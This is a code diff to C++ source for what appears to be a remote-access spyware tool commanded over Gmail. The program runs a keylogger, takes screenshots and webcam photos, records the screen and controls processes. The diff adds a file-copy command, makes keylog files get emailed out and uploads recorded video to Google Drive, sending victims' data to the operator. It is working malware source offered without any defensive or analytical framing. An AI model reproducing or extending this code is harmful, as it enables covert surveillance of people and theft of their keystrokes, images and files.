@@ -110,7 +110,8 @@ bool isValidCommand(const std::string& cmd)
     static const std::set<std::string> validCommands = {
         "help", "list_services", "start ", "stop ", "list_apps",
         "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
-        "restart", "shutdown", "start_record", "stop_record", "gmail_server"
+        "restart", "shutdown", "start_record", "stop_record", "gmail_server", 
+        "copyfile "
     };
 
     for (const auto& validCmd : validCommands)
@@ -129,20 +130,20 @@ std::string executeCommand(const std::string& cmd)
     {
         std::string helpMsg = 
             "Available commands:\n"
-            "  help                    - Show this help message\n"
-            "  list_services           - List all running services\n"
-            "  start <path>            - Start a process from given path\n"
-            "  stop <process_name>     - Stop a process by name\n"
-            "  list_apps               - List all visible applications\n"
-            "  copyfile <source>       - Copy file from source to current directory\n"
-            "  start_keylogger         - Start keylogger\n"
-            "  stop_keylogger          - Stop keylogger\n"
-            "  screenshot              - Capture screen and save as PNG\n"
-            "  webcam_photo            - Capture single webcam photo\n"
-            "  restart                 - Restart the system\n"
-            "  shutdown                - Shutdown the system\n"
-            "  start_record            - Start screen recording\n"
-            "  stop_record             - Stop screen recording\n";
+            "help                                  - Show this help message\n"
+            "list_services                     - List all running services\n"
+            "start <path>                     - Start a process from given path\n"
+            "stop <process_name>     - Stop a process by name\n"
+            "list_apps                          - List all visible applications\n"
+            "copyfile <source>            - Copy file from source to current directory\n"
+            "start_keylogger               - Start keylogger\n"
+            "stop_keylogger               - Stop keylogger\n"
+            "screenshot                      - Capture screen and save as PNG\n"
+            "webcam_photo               - Capture single webcam photo\n"
+            "restart                             - Restart the system\n"
+            "shutdown                        - Shutdown the system\n"
+            "start_record                    - Start screen recording\n"
+            "stop_record                    - Stop screen recording\n";
         return helpMsg;
     }
     else if (cmd == "list_services")
@@ -175,25 +176,25 @@ std::string executeCommand(const std::string& cmd)
     {
         std::string sourcePath = cmd.substr(9);
         std::string destPath = fs::current_path().string() + "\\" + fs::path(sourcePath).filename().string();
-        if (fs::copy_file(sourcePath, destPath, fs::copy_options::overwrite_existing))
+        if (copyFile(sourcePath, destPath))
         {
-            return "File copied successfully to: " + destPath;
+            return destPath;
         }
         else
         {
-            return "Failed to copy file from: " + sourcePath;
+            return "Failed to copy file.";
         }
     }
     else if (cmd == "start_keylogger")
     {
-        std::string filename = fs::current_path().string() + "\\keylog.txt";
         startKeylogger();
-        return "Keylogger started. Logs will be saved to: " + filename;
+        return "Keylogger started";
     }
     else if (cmd == "stop_keylogger")
     {
         stopKeylogger();
-        return "Keylogger stopped.";
+        std::string filename = fs::current_path().string() + "\\keylog.txt";
+        return filename;
     }
     else if (cmd == "screenshot")
     {
@@ -263,23 +264,51 @@ void startGmailControlLoop()
                 return str.size() >= suffix.size() &&
                        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
             };
+
             // Check if response is a file path
-            if (ends_with(response, ".txt") || ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi"))
+            if (ends_with(response, ".avi"))
+            {
+                std::string uploadCmd = "python \"" + script_dir + "upload_to_drive.py\" \"" + response + "\" > \"" + script_dir + "share_link.txt\"";
+                int uploadResult = system(uploadCmd.c_str());
+
+                if (uploadResult != 0)
+                {
+                    sendEmail("Command Response", "Failed to upload video to Google Drive.");
+                }
+                else
+                {
+                    std::ifstream linkFile(script_dir + "share_link.txt");
+                    std::string shareLink;
+                    std::getline(linkFile, shareLink);
+                    linkFile.close();
+
+                    if (!shareLink.empty())
+                    {
+                        std::string driveArg = "drive:" + shareLink;
+                        sendEmailWithAttachment("Recorded Video", "Video uploaded to Google Drive.", "drive:" + driveArg);
+                    }
+                    else
+                    {
+                        sendEmail("Command Response", "Upload succeeded but failed to read share link.");
+                    }
+                }
+            }
+            else if (ends_with(response, ".txt") || ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".pdf"))
             {
                 if (!sendEmailWithAttachment("Command Response", "See attached file for details.", response))
                 {
-                    std::cerr << "[Gmail] Failed to send email with attachment." << std::endl;
+                    sendEmail("Command Response", "Failed to send file attachment. Response: " + response);
                 }
             }
             else
             {
                 if (!sendEmail("Command Response", response))
                 {
-                    std::cerr << "[Gmail] Failed to send email." << std::endl;
+                    sendEmail("Command Response", "Failed to send response. Original command: " + cmd + "\nResponse: " + response);
                 }
             }
         }
 
-        std::this_thread::sleep_for(std::chrono::seconds(10));
+        std::this_thread::sleep_for(std::chrono::seconds(3));
     }
 }
